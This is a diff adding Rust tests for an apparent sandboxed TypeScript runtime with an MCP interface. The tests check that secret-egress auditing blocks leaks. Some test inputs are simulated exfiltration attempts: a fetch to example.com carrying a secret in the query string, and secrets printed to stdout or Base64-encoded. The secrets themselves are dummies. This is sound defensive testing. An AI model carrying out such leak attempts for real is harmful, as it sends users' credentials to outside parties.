@@ -857,6 +857,143 @@ fn test_issue_11_memory_cap_enforced_and_fuel_scales_with_work() {
     );
 }
 
+#[test]
+fn test_issue_15_mcp_honors_audit_egress_env_dotenv_and_deterministic_seed() {
+    use crate::config::ResolvedExecutionConfig;
+    use crate::mcp_and_repl::handle_mcp_jsonrpc_line;
+    use slice_engine::SliceIsolate;
+
+    let tmp_dir = std::env::temp_dir().join(format!("slice_issue15_{}", std::process::id()));
+    let _ = std::fs::create_dir_all(&tmp_dir);
+    let dotenv_file = tmp_dir.join(".env");
+    std::fs::write(
+        &dotenv_file,
+        "STRIPE_SECRET_KEY=sk_live_dotenv_secret_15\nPUBLIC_APP_NAME=slice-mcp\n",
+    )
+    .unwrap();
+
+    let args = vec![
+        "mcp".to_string(),
+        format!("--env-file={}", dotenv_file.display()),
+        "--audit-egress=sk_live_topsecret_9".to_string(),
+        "--deterministic=777".to_string(),
+        "--allow-net=example.com:443".to_string(),
+    ];
+    let exec_cfg = ResolvedExecutionConfig::from_cli_args(&args).unwrap();
+    assert_eq!(exec_cfg.deterministic_seed, Some(777));
+    assert!(exec_cfg
+        .audit_secrets
+        .contains(&"sk_live_topsecret_9".to_string()));
+    assert!(exec_cfg
+        .audit_secrets
+        .contains(&"sk_live_dotenv_secret_15".to_string()));
+
+    let mut isolate = SliceIsolate::spawn(
+        "mcp-agent-host",
+        115,
+        exec_cfg.caps,
+        exec_cfg.fuel_limit,
+        exec_cfg.mem_limit,
+    );
+    isolate.set_deterministic_seed(exec_cfg.deterministic_seed);
+    for sec in &exec_cfg.audit_secrets {
+        isolate.add_egress_audit_secret(sec.clone());
+    }
+
+    // 1. Outbound fetch leaking sk_live_topsecret_9 is blocked in MCP
+    let leak1 = handle_mcp_jsonrpc_line(
+        r#"{"jsonrpc":"2.0","id":60,"method":"tools/call","params":{"name":"slice_eval_ts","arguments":{"code":"Slice.fetchSync(\"https://example.com/x?k=sk_live_topsecret_9\").status"}}}"#,
+        &mut isolate,
+    )
+    .unwrap();
+    assert!(leak1.contains(r#""isError":true"#), "Got: {}", leak1);
+    assert!(
+        leak1.contains("EGRESS_SECRET_LEAK_BLOCKED"),
+        "Got: {}",
+        leak1
+    );
+
+    // 2. Outbound fetch or stdout leaking .env Auto-DLP secret is also blocked in MCP
+    let leak2 = handle_mcp_jsonrpc_line(
+        r#"{"jsonrpc":"2.0","id":61,"method":"tools/call","params":{"name":"slice_eval_ts","arguments":{"code":"console.log(\"sk_live_dotenv_secret_15\"); 1"}}}"#,
+        &mut isolate,
+    )
+    .unwrap();
+    assert!(leak2.contains(r#""isError":true"#), "Got: {}", leak2);
+    assert!(
+        leak2.contains("EGRESS_SECRET_LEAK_BLOCKED"),
+        "Got: {}",
+        leak2
+    );
+
+    let _ = std::fs::remove_dir_all(&tmp_dir);
+}
+
+#[test]
+fn test_issue_16_mcp_multiple_audit_secrets_deterministic_seed_and_schema_sync() {
+    use crate::mcp_and_repl::handle_mcp_jsonrpc_line;
+    use slice_engine::SliceIsolate;
+    use slice_sandbox::CapabilityToken;
+
+    let mut isolate = SliceIsolate::spawn(
+        "mcp-agent-host",
+        116,
+        CapabilityToken::pure_compute(),
+        5_000_000,
+        16 * 1024 * 1024,
+    );
+
+    // 1. Verify tools/list advertises auditSecrets, deterministicSeed, checkpoints, maxCheckpoints
+    let list_resp = handle_mcp_jsonrpc_line(
+        r#"{"jsonrpc":"2.0","id":70,"method":"tools/list","params":{}}"#,
+        &mut isolate,
+    )
+    .unwrap();
+    assert!(list_resp.contains(r#""auditSecrets""#));
+    assert!(list_resp.contains(r#""deterministicSeed""#));
+    assert!(list_resp.contains(r#""checkpoints""#));
+    assert!(list_resp.contains(r#""maxCheckpoints""#));
+
+    // 2. Multiple secrets in `auditSecrets` array are all guarded (including Base64 forms)
+    let leak_second = handle_mcp_jsonrpc_line(
+        r#"{"jsonrpc":"2.0","id":71,"method":"tools/call","params":{"name":"slice_eval_ts","arguments":{"code":"Buffer.from(\"db_pass_second_secret_99\").toString(\"base64\")","auditSecrets":["pay_key_first_secret_11","db_pass_second_secret_99"]}}}"#,
+        &mut isolate,
+    )
+    .unwrap();
+    assert!(
+        leak_second.contains(r#""isError":true"#),
+        "Got: {}",
+        leak_second
+    );
+    assert!(
+        leak_second.contains("EGRESS_SECRET_LEAK_BLOCKED"),
+        "Got: {}",
+        leak_second
+    );
+
+    // 3. deterministicSeed produces identical Math.random() sequences across calls
+    let det1 = handle_mcp_jsonrpc_line(
+        r#"{"jsonrpc":"2.0","id":72,"method":"tools/call","params":{"name":"slice_eval_ts","arguments":{"code":"Math.random().toFixed(8)","deterministicSeed":123456}}}"#,
+        &mut isolate,
+    )
+    .unwrap();
+    let det2 = handle_mcp_jsonrpc_line(
+        r#"{"jsonrpc":"2.0","id":73,"method":"tools/call","params":{"name":"slice_eval_ts","arguments":{"code":"Math.random().toFixed(8)","deterministicSeed":123456}}}"#,
+        &mut isolate,
+    )
+    .unwrap();
+    let v1: serde_json::Value = serde_json::from_str(&det1).unwrap();
+    let v2: serde_json::Value = serde_json::from_str(&det2).unwrap();
+    let p1: serde_json::Value =
+        serde_json::from_str(v1["result"]["content"][0]["text"].as_str().unwrap()).unwrap();
+    let p2: serde_json::Value =
+        serde_json::from_str(v2["result"]["content"][0]["text"].as_str().unwrap()).unwrap();
+    assert_eq!(p1["returnValue"], p2["returnValue"]);
+    assert!(p1["spawnTimeNs"].as_u64().unwrap() >= 1);
+    assert!(p1["compileTimeNs"].as_u64().unwrap() >= 1);
+    assert!(p1["execTimeNs"].as_u64().unwrap() >= 1);
+}
+
 
 
 
